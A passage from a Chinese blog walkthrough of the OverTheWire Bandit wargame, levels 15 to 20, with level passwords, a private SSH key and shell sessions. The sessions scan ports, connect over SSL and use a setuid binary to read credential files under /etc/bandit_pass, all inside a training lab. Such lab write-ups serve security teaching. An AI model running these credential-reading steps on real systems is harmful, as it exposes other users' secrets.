class=\"line\">mU9Nzwn++4qxe16OvvmXAzctH2RlDx7XbcsCAwEAAaMNMAswCQYDVR0TBAIwADAN</div><div class=\"line\">BgkqhkiG9w0BAQsFAAOCAQEADHODX5CcMLI5fdumzly5FAVg5Yc22eDGNhmyhi/N</div><div class=\"line\">kDhP6QYw+HW5nWEYapc9m/ZQGEEoxr+wj6qeEhscxRxpuEIcunZsLKcoAmToyXeO</div><div class=\"line\">ANMslQugRcGqN57Pt0h5VuctLMa3ickeVPFvV6gxJSHBNRK1iN8nrfsy+zR+stzI</div><div class=\"line\">xcjIuakDDxMKFtb/1TMKf4/EsimSQLS0WXLjbxfQ/J510O4/Of0tmZI0ZIG+cKmM</div><div class=\"line\">V5hAOtuuAk6jREfWYJQ3DB+phv7PO9s2FpofVJss5PK4NWDS7UQOv359ZOJ85ZpJ</div><div class=\"line\">ihGxDqV7IAHJZNM9lvFXz/+EOn1oTGW9V8bAwt34OVYoPw==</div><div class=\"line\">-----END CERTIFICATE-----</div><div class=\"line\">subject=/CN=8f75dc271013</div><div class=\"line\">issuer=/CN=8f75dc271013</div><div class=\"line\">---</div><div class=\"line\">No client certificate CA names sent</div><div class=\"line\">---</div><div class=\"line\">SSL handshake has <span class=\"built_in\">read</span> 1682 bytes and written 637 bytes</div><div class=\"line\">---</div><div class=\"line\">New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA</div><div class=\"line\">Server public key is 2048 bit</div><div class=\"line\">Secure Renegotiation IS supported</div><div class=\"line\">Compression: NONE</div><div class=\"line\">Expansion: NONE</div><div class=\"line\">SSL-Session:</div><div class=\"line\">    Protocol  : SSLv3</div><div class=\"line\">    Cipher    : DHE-RSA-AES256-SHA</div><div class=\"line\">    Session-ID: C193C0A99C7335DB7D7B7B89367CF5E6A514E4FF58066E86A47070BCD02F7BC5</div><div class=\"line\">    Session-ID-ctx: </div><div class=\"line\">    Master-Key: 5D0EB4E12667C302D7D9AAB88855BF67DA51124248593FC4B5613C6BBCF69C145BF0B37DCA5A3765A8DFD2EBDC84B248</div><div class=\"line\">    Key-Arg   : None</div><div class=\"line\">    PSK identity: None</div><div class=\"line\">    PSK identity hint: None</div><div class=\"line\">    SRP username: None</div><div class=\"line\">    Start Time: 1510423808</div><div class=\"line\">    Timeout   : 300 (sec)</div><div class=\"line\">    Verify <span class=\"built_in\">return</span> code: 18 (self signed certificate)</div><div class=\"line\">---</div><div class=\"line\">BfMYroe26WYalil77FoDi9qh59eK5xNr</div><div class=\"line\">Correct!</div><div class=\"line\">cluFn7wTiGryunymYOu4RcffSxQluehd</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">read</span>:errno=0</div></pre></td></tr></table></figure>\n<p>心路历程：我们使用 <code>openssl</code> 的 <code>s\\_client</code> SSL/TSL 客户端程序连接服务器，成功后复制粘贴我们本关的密码就能得到下一关的密码了。多看手册哦。<br>提示：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit15@bandit:~$ man openssl</div><div class=\"line\">bandit15@bandit:~$ man s_client</div></pre></td></tr></table></figure></p>\n<hr>\n<p>Level 16 -17<br>描述：可以通过将当前级别的密码提交到本地主机上31000到32000范围内的端口来检索下一级别的凭证。首先找出哪些端口有服务器正在侦听它们。然后找出哪些人说SSL和哪些不。只有一个服务器会提供下一个凭据，其他的只是发回你发给它的内容。<br>密码：xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 先扫描开放端口</span></div><div class=\"line\">bandit16@bandit:~$ nmap -p 31000-32000 localhost</div><div class=\"line\"></div><div class=\"line\">Starting Nmap 6.40 ( http://nmap.org ) at 2017-11-12 09:08 UTC</div><div class=\"line\">Nmap scan report <span class=\"keyword\">for</span> localhost (127.0.0.1)</div><div class=\"line\">Host is up (0.00047s latency).</div><div class=\"line\">Other addresses <span class=\"keyword\">for</span> localhost (not scanned): 127.0.0.1</div><div class=\"line\">Not shown: 996 closed ports</div><div class=\"line\">PORT      STATE SERVICE</div><div class=\"line\">31046/tcp open  unknown</div><div class=\"line\">31518/tcp open  unknown</div><div class=\"line\">31691/tcp open  unknown</div><div class=\"line\">31790/tcp open  unknown</div><div class=\"line\">31960/tcp open  unknown</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 依次给5个端口发送消息,其他端口只会返回你发给它的内容。</span></div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31046    </div><div class=\"line\">Hello World!</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31518</div><div class=\"line\">ERROR</div><div class=\"line\">140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31691</div><div class=\"line\">Hello World!</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31790</div><div class=\"line\">ERROR</div><div class=\"line\">140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31960</div><div class=\"line\">Hello World!</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 我们发现有两个端口是SSL的，分别给这两个端口发送数据测试。</span></div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World\"</span> | openssl s_client -quiet -connect localhost:31518</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify error:num=18:self signed certificate</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">Hello World</div><div class=\"line\"><span class=\"comment\"># 因为回复了Hello World，确定这个属于「其他端口」这里直接发送密码给 31790 端口</span></div><div class=\"line\">bandit16@bandit:~$ cat /etc/bandit_pass/bandit16 | openssl s_client -quiet -connect localhost:31790</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify error:num=18:self signed certificate</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">Correct!</div><div class=\"line\">-----BEGIN RSA PRIVATE KEY-----</div><div class=\"line\">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</div><div class=\"line\">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</div><div class=\"line\">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</div><div class=\"line\">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</div><div class=\"line\">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</div><div class=\"line\">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</div><div class=\"line\">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</div><div class=\"line\">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</div><div class=\"line\">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</div><div class=\"line\">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</div><div class=\"line\">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</div><div class=\"line\">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</div><div class=\"line\">8c8hAuRBb2G82so8vUHk/fur85OE<span class=\"built_in\">fc</span>9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</div><div class=\"line\">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</div><div class=\"line\">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</div><div class=\"line\">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</div><div class=\"line\">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</div><div class=\"line\">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</div><div class=\"line\">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgX<span class=\"keyword\">in</span>B3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</div><div class=\"line\">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</div><div class=\"line\">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</div><div class=\"line\">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</div><div class=\"line\">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</div><div class=\"line\">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</div><div class=\"line\">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</div><div class=\"line\">-----END RSA PRIVATE KEY-----</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">read</span>:errno=0</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 存到文件中</span></div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"-----BEGIN RSA PRIVATE KEY-----</span></div><div class=\"line\">&gt; MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</div><div class=\"line\">&gt; imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</div><div class=\"line\">&gt; Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</div><div class=\"line\">&gt; DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</div><div class=\"line\">&gt; JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</div><div class=\"line\">&gt; x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</div><div class=\"line\">&gt; KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</div><div class=\"line\">&gt; J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</div><div class=\"line\">&gt; d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</div><div class=\"line\">&gt; YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</div><div class=\"line\">&gt; vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</div><div class=\"line\">&gt; +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</div><div class=\"line\">&gt; 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</div><div class=\"line\">&gt; SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</div><div class=\"line\">&gt; HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</div><div class=\"line\">&gt; SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</div><div class=\"line\">&gt; R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</div><div class=\"line\">&gt; Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</div><div class=\"line\">&gt; R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</div><div class=\"line\">&gt; L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</div><div class=\"line\">&gt; blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</div><div class=\"line\">&gt; YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</div><div class=\"line\">&gt; 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</div><div class=\"line\">&gt; dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</div><div class=\"line\">&gt; vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</div><div class=\"line\">&gt; -----END RSA PRIVATE KEY-----\" &gt; ssh.private</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 修改文件权限，确保他人不被允许访问这个文件，不然不会被认证端认同</span></div><div class=\"line\">bandit16@bandit:~$ chmod 600 ssh.private</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 连接</span></div><div class=\"line\">bandit16@bandit:~$ ssh -i ssh.private bandit17@localhost -p 2220</div><div class=\"line\"> _                     _ _ _   </div><div class=\"line\">| |__   __ _ _ __   __| (_) |_ </div><div class=\"line\">| <span class=\"string\">'_ \\ / _` | '</span>_ \\ / _` | | __|</div><div class=\"line\">| |_) | (_| | | | | (_| | | |_ </div><div class=\"line\">|_.__/ \\__,_|_| |_|\\__,_|_|\\__|</div><div class=\"line\">                               </div><div class=\"line\">a http://www.overthewire.org wargame.</div><div class=\"line\"></div><div class=\"line\">...</div><div class=\"line\">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17</div><div class=\"line\">xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</div></pre></td></tr></table></figure>\n<p>心路历程：这关把过程注释在了上面的代码中，帮助大家路顺思路，这里就不赘述了。</p>\n<hr>\n<p>Level 17 -18</p>\n<p>描述：homedirectory中有两个文件：passwords.old和passwords.new。下一级的密码是passwords.new中跟.old唯一不同的一行</p>\n<p>密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit17@bandit:~$ ll</div><div class=\"line\">total 44</div><div class=\"line\">drwxr-xr-x  4 bandit17 bandit17 4096 Nov 12 10:42 ./</div><div class=\"line\">drwxr-xr-x 30 root     root     4096 Nov 12 10:42 ../</div><div class=\"line\">-rw-r-----  1 bandit17 bandit17   33 Sep 28 14:04 .bandit16.password</div><div class=\"line\">-rw-r--r--  1 bandit17 bandit17  220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit17 bandit17 3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit17 bandit17 4096 Nov 12 10:42 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit17 bandit17  675 Apr  9  2014 .profile</div><div class=\"line\">drwxr-xr-x  2 root     root     4096 Sep 28 14:04 .ssh/</div><div class=\"line\">-rw-r-----  1 bandit17 bandit17 1704 Sep 28 14:04 .ssl-cert-snakeoil.key</div><div class=\"line\">-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.new</div><div class=\"line\">-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.old</div><div class=\"line\">bandit17@bandit:~$ diff passwords.old passwords.new</div><div class=\"line\">42c42</div><div class=\"line\">&lt; R3GQabj3vKRTcjTTISWvO1RJWc5sqSXO</div><div class=\"line\">---</div><div class=\"line\">&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</div></pre></td></tr></table></figure>\n<p>心路历程：描述说的很清晰，这里直接 diff 就好了。</p>\n<hr>\n<p>Level 18 -19</p>\n<p>描述：下一级别的密码存储在家庭目录中的 readme 文件中。不幸的是，当你用SSH登录时，有人修改了.bashrc将你注销。</p>\n<p>密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</p>\n<p>这里就厉害了……<br><img src=\"/Image/bandit_resources/5C57A9F0545D1CDEA58442EEDC952A51.jpg\" alt=\"IMAGE\"><br>输入密码后，跟我说了句拜拜然后给我一脚……<br>卧槽忍不了。<br>常年看 man 手册的老司机表示年轻人要低调，密码我还是能拿到。<br>先看 <code>man ssh</code> 说了什么：<br><img src=\"/Image/bandit_resources/5750971C77CDE09AD8C9ED4D020D4701.jpg\" alt=\"IMAGE\"><br>Secure Shell 中的配置页面也预留了 Command 配置:<br><img src=\"/Image/bandit_resources/AD0B25D055288B2474EDD87D747BCF9F.jpg\" alt=\"IMAGE\"><br>配置好之后点连接，输入密码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"> _                     _ _ _   </div><div class=\"line\">| |__   __ _ _ __   __| (_) |_ </div><div class=\"line\">| <span class=\"string\">'_ \\ / _` | '</span>_ \\ / _` | | __|</div><div class=\"line\">| |_) | (_| | | | | (_| | | |_ </div><div class=\"line\">|_.__/ \\__,_|_| |_|\\__,_|_|\\__|</div><div class=\"line\">                               </div><div class=\"line\">a http://www.overthewire.org wargame.</div><div class=\"line\"></div><div class=\"line\">bandit18@bandit.labs.overthewire.org<span class=\"string\">'s password: </span></div><div class=\"line\">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</div></pre></td></tr></table></figure></p>\n<p>心路历程：如果事先不知道，卡住是正常的，但是如果之前用到 <code>ssh</code> 命令的时候仔细看看 man 手册，不知道吗？不存在的……<br>该反省的反省。</p>\n<hr>\n<p>Level 19 - 20</p>\n<p>描述：要访问下一个级别，您应该使用homeu目录中的setuid二进制文件。 不带参数的执行它找出如何使用它。 在使用setuid二进制文件后，可以在通常的地方（/etc/bandit_pass）找到这个级别的密码。</p>\n<p>密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j</p>\n<p>说实话我没抬读懂这个 setuid binary，不过不影响。大致意思就是告诉你 Home 目录下有个文件，先不带参数执行一下，他会告诉你怎么用。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">bandit19@bandit:~$ ll</div><div class=\"line\">total 32</div><div class=\"line\">drwxr-xr-x  3 bandit19 bandit19 4096 Nov 12 11:30 ./</div><div class=\"line\">drwxr-xr-x 30 root     root     4096 Nov 12 11:30 ../</div><div class=\"line\">-rw-r--r--  1 bandit19 bandit19  220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit19 bandit19 3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit19 bandit19 4096 Nov 12 11:30 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit19 bandit19  675 Apr  9  2014 .profile</div><div class=\"line\">-rwsr-x---  1 bandit20 bandit19 7378 Sep 28 14:04 bandit20-do*</div><div class=\"line\"><span class=\"comment\"># 看起来就是bandit20-do了</span></div><div class=\"line\">bandit19@bandit:~$ ./bandit20-do </div><div class=\"line\">Run a <span class=\"built_in\">command</span> as another user.</div><div class=\"line\">  Example: ./bandit20-do id</div><div class=\"line\">bandit19@bandit:~$ ./bandit20-do</div><div class=\"line\"><span class=\"comment\"># 人家已经告诉你了，会使用另一个用户执行命令，再返回去看一眼她的权限 -rwsr-x---</span></div><div class=\"line\">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</div><div class=\"line\">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</div></pre></td></tr></table></figure>\n<p>心路历程：嗯，有种报复社会的感觉。</p>\n<hr>\n<p>Level 20 -21</p>\n<p>描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它将连接 localhost:[命令行参数的上的端口]。然后从连接中读取一行文本，并将其与上一级（bandit20）中的密码进行比较。如果密码正确，将传送下一级密码（bandit21）。</p>\n<p>注意：基础设施的变化使这一层面更加困难。您将需要找出在同一个Docker实例中启动多个命令的方法。</p>\n<p>密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p>\n<p>这关的大意呢是告诉你，你的 Home 目录下有一个二进制文件（setuid又出现了……），你执行它，并提供给它端口号，它会请求这个端口并获取这个端口提供给他的数据，如果数据和 bandit20 的密码相同，他就会告诉你下一关的密码。<br>并且给了注意事项:<a href=\"http://overthewire.org/help/sshinfra.html\" target=\"_blank\" rel=\"external\">Changes to the infrastructure</a>。<br>注意事项中提到了他们的游戏是运行在 Docker 容器上的，默认会给每一次连接分配一个全新的环境，如果当你完成游戏需要开启两个终端 并会产生交互的话，可能需要一些特殊的手段（ssh -L localport:host:port），我们后面再讲这个操作，先分析下他要我们干什么。</p>\n<p>他提到：这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。<br>监听端口与访问端口有可能用到两个终端，而且是存在交互的，这也是他给我们提示的初衷。<br>我们做这关呢，有两个解法。一个是本着学习的态度，走提示流程，一个是日常野路子解法。我们先说说提示的思路。</p>\n<h3 id=\"思路一：\"><a href=\"#思路一：\" class=\"headerlink\" title=\"思路一：\"></a>思路一：</h3><p>这个跑在 Docker 容器内的游戏，每一次连接都是全新的环境，那我们一个监听，一个请求，需要保证两个终端能够通信，监听的一段正常监听，请求的一端再去请求。所以我们现在要创建两个能交互的终端。方法是借助 <code>ssl -L</code> 这个命令，先查一下这个命令。然后再看会好很多。<br>嗯……先给你3分钟查一查，不够的话再来3分钟也行……</p>\n<p><img src=\"/Image/bandit_resources/9D5E08F5F93CA44BC4287F54BD6661FC.jpg\" alt=\"IMAGE\"><br>拿实际例子来说，当我们这样配置并连接的时候，我们请求连接本地主机的 1234 端口时这个请求会转发到 <code>bandit.labs.overthewire.org</code>，它会来访问 <code>localhost</code> (此时，对于 <code>bandit.labs.overthewire.org</code> 来讲 <code>localhost</code> 是它自身)的 22 端口。<br>注意事项中告诉我们，这样就可以在提供 -L 参数的这个连接不关闭的情况下，通过本地端口转发，建立另一条连接并能够与前一个连接搞基。</p>\n<p>那我们的第二个连接就是这样的：<br><img src=\"/Image/bandit_resources/CA9CFE5E31145E899BB4D6AD535E8B21.jpg\" alt=\"IMAGE\"></p>\n<p>我们在其中一个终端中创建一个发送本关密码的监听：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit20@bandit:~$ nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20</div></pre></td></tr></table></figure></p>\n<p>此时光标会在第二行等待，监听命令没有执行完毕退出。<br>我们在第二个终端中，我们来看看他所说的这个程序：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit20@bandit:~$ ll</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x  2 root     root     4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 29 root     root     4096 Nov 13 15:57 ../</div><div class=\"line\">-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout</div><div class=\"line\">-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc</div><div class=\"line\">-rw-r--r--  1 root     root      655 Jun 24  2016 .profile</div><div class=\"line\">-rwsr-x---  1 bandit21 bandit20 8044 Nov 13 15:58 suconnect*</div><div class=\"line\">bandit20@bandit:~$ ./suconnect </div><div class=\"line\">Usage: ./suconnect &lt;portnumber&gt;</div><div class=\"line\">This 